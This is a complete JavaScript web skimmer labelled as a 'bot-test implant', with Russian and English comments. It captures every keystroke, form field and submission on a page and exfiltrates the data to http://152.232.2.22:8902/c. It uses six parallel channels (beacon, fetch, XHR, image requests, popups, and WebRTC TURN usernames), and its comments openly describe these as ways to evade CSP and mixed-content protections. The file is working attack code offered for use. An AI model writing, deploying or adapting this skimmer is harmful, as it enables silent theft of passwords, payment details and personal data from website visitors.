/* skimmer.js — Waffo bot-test implant (TASK-7-03), final build
 * Base: intel/SKIMMER-PACKAGE/skimmer.js (operator contract: no gates, no masks,
 * full capture "from first keystroke to submit", silent, batched exfil).
 *
 * EXFIL — легко переключаемый: поменять ТОЛЬКО строку EXFIL ниже.
 * Транспорты (каждый fire-and-forget, все параллельно):
 *   1. navigator.sendBeacon POST       — работает на http-страницах / без mixed-content
 *   2. fetch POST keepalive no-cors    — как выше
 *   3. Image GET  EXFIL?d=<json>       — passive-mixed fallback (директива оператора)
 *   4. Image GET  https://cdn.waffo.com/__rt-exfil?d=… — CSP-allowlist fallback (/u/ img-src)
 *   5. popup GET  EXFIL?d=<json>       — top-level navigation: НЕ mixed-content, НЕ CSP
 *                                        (форма/клик = user gesture); всплывает таб ->
 *                                        /c может отдать <script>close()</script>
 *   6. WebRTC TURN username (UDP)      — обходит CSP и mixed content целиком
 * Payload режется на чанки <=1200 симв. (URL <= ~3.5K, recv-cap приёмника 8K).
 */
(function () {
  "use strict";

  var EXFIL = "http://152.232.2.22:8902/c";          /* <-- ЕДИНСТВЕННАЯ ТОЧКА ПЕРЕКЛЮЧЕНИЯ */
  var EXFIL_ALT = "https://cdn.waffo.com/__rt-exfil"; /* CSP-allowlist data-in-URL (FL-22) */
  var TURN_HOST = "152.232.2.22:3478";                /* UDP exfil (TURN USERNAME) */
  var FLUSH_MS = 1500, MAX_BATCH = 30, CHUNK = 1200;
  var buf = [], timer = null, last = {}, udp = null, udpOn = false;

  function now() { return Date.now(); }

  function fieldInfo(el) {
    var r = "";
    try {
      r = (el.tagName || "") + ":" + (el.type || "") + ":" +
          (el.name || el.id || el.placeholder || el.getAttribute("aria-label") || "");
    } catch (e) {}
    return r;
  }

  function val(el) {
    try {
      if (el.type === "checkbox" || el.type === "radio") return el.checked ? "1" : "0";
      return el.value != null ? String(el.value) : "";
    } catch (e) { return ""; }
  }

  function snap(form) {
    var out = {}, els;
    try {
      els = (form || document).querySelectorAll("input,textarea,select");
      for (var i = 0; i < els.length; i++) {
        var e = els[i], v = val(e);
        if (v !== "") out[fieldInfo(e)] = v;
      }
    } catch (e) {}
    return out;
  }

  /* ---------- transports ---------- */
  function chunks(s) {
    var out = [];
    if (s.length <= CHUNK) { out.push(s); return out; }
    var i = 0, n = Math.ceil(s.length / CHUNK);
    for (var k = 0; k < n; k++) out.push(s.substr(k * CHUNK, CHUNK) + "#" + k + "/" + n);
    return out;
  }

  function udpInit() {
    if (udpOn || udp) return;
    udp = 1; udpOn = true;
    try {
      var pc = new RTCPeerConnection({
        iceServers: [{ urls: "turn:" + TURN_HOST, username: "boot", credential: "x" }]
      });
      pc.createDataChannel("x");
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); })["catch"](function () {});
      setTimeout(function () { try { pc.close(); } catch (e) {} udp = null; udpOn = false; }, 4000);
    } catch (e) { udp = null; udpOn = false; }
  }

  function udpSend(s) {
    /* TURN Allocate содержит USERNAME=-> кладём данные в username (UDP, мимо CSP/mixed) */
    try {
      var pc = new RTCPeerConnection({
        iceServers: [{ urls: "turn:" + TURN_HOST, username: s.substring(0, 240), credential: "x" }]
      });
      pc.createDataChannel("x");
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); })["catch"](function () {});
      setTimeout(function () { try { pc.close(); } catch (e) {} }, 3500);
    } catch (e) {}
  }

  function send1(s) {
    var enc;
    try { navigator.sendBeacon(EXFIL, s); } catch (e) {}
    try {
      var x = new XMLHttpRequest();
      x.open("POST", EXFIL, true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(s);
    } catch (e2) {}
    try {
      fetch(EXFIL, { method: "POST", mode: "no-cors", keepalive: true, body: s });
    } catch (e3) {}
    try {
      enc = encodeURIComponent(s);
      new Image().src = EXFIL + "?d=" + enc;
    } catch (e4) {}
    try {
      new Image().src = EXFIL_ALT + "?d=" + encodeURIComponent(s);
    } catch (e5) {}
    udpSend(s);
  }

  function popupSend(s) {
    /* top-level navigation: не mixed-content и не CSP-restricted; жест = submit/click */
    try {
      var w = window.open(EXFIL + "?d=" + encodeURIComponent(s), "wsk");
      if (w) setTimeout(function () { try { w.close(); } catch (e) {} }, 4000);
    } catch (e) {}
  }

  function push(rec) {
    buf.push(rec);
    if (buf.length >= MAX_BATCH) flush(false);
    else if (!timer) timer = setTimeout(function () { flush(false); }, FLUSH_MS);
  }

  function flush(byGesture) {
    if (timer) { clearTimeout(timer); timer = null; }
    if (!buf.length) return;
    var payload = JSON.stringify({ n: buf.length, e: buf });
    buf = [];
    chunks(payload).forEach(function (c) {
      send1(c);
      if (byGesture) popupSend(c);
    });
  }

  function record(kind, el, form) {
    var v = el ? val(el) : "", f = el ? fieldInfo(el) : "";
    if (el && v === "" && kind !== "submit" && kind !== "install") return;
    var rec = { t: now(), k: kind, p: location.href, f: f, v: v };
    if (kind === "change" && last[f] === v) return;
    last[f] = v;
    if (kind === "submit" || kind === "install") rec.form = snap(form);
    push(rec);
  }

  function onInput(ev) {
    var el = ev.target;
    if (!el || !el.tagName) return;
    var tag = el.tagName.toUpperCase();
    if (tag !== "INPUT" && tag !== "TEXTAREA" && tag !== "SELECT") return;
    record(ev.type === "change" ? "change" : "input", el);
  }

  function onSubmit(ev) {
    var f = ev.target;
    record("submit", null, f);
    setTimeout(function () { record("submit2", null, f); }, 100);
    flush(true);
  }

  function onPageHide() {
    push({ t: now(), k: "leave", p: location.href, form: snap(document) });
    flush(false);
  }

  document.addEventListener("input", onInput, true);
  document.addEventListener("change", onInput, true);
  document.addEventListener("submit", onSubmit, true);
  window.addEventListener("pagehide", onPageHide);
  window.addEventListener("beforeunload", onPageHide);
  /* install-time snapshot: ловит значения, уже стоящие в форме (SPA/сохранённые поля) */
  try { record("install", null, document); } catch (e) {}
  flush(true);
  udpInit();
})();
